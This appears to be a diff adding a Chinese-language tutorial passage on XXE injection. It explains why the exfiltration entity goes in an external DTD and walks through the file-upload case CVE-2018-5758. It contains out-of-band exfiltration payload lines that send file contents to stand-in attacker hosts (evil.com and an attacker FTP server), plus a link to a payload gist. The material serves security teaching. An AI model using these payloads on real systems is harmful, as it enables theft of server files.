@@ -47,3 +47,22 @@ evil.dtd
 --httpport=999 反向连接的端口号，不加这个参数默认是80.
 --oob=http 
 --phpfilter（用上面的php伪协议来处理)
+
+为什么负责数据发送的参数实体一定要放在外部DTD中声明？
+
+这是由于在内部DTD声明时，参数实体引用不能出现在标记声明中，而外部DTD没有这个限制。也就是说如果把“http://evil.com/?data=%file;”写在PoC本体的内部DTD声明的标签中，解析“%file;”时就会抛出异常。
+
+XML文档数据的存在不止有HTTP的POST，文件也是XXE经常出没的一个地方。
+
+例如CVE-2018-5758，应用程序中有一个上传文件并共享的功能，在公开已上传的文件之前，应用程序会尝试使用Flash将文件内容展示在页面上。
+
+向攻击服务器上传一个DTD文件，内容如下：
+
+<!ENTITY % all "<!ENTITY send SYSTEM'ftp://our-external-server.com:8080/%file;'>">
+
+%all;
+
+构造一个“恶意”文件，在其中使用一个外部实体引用来向攻击服务器DTD文件资源发送HTTP请求。通过应用程序的上传文件功能上传“恶意”文件，在点击“查看”按钮时，XXE注入攻击成功：
+
+XXE payload:
+https://gist.github.com/staaldraad/01415b990939494879b4
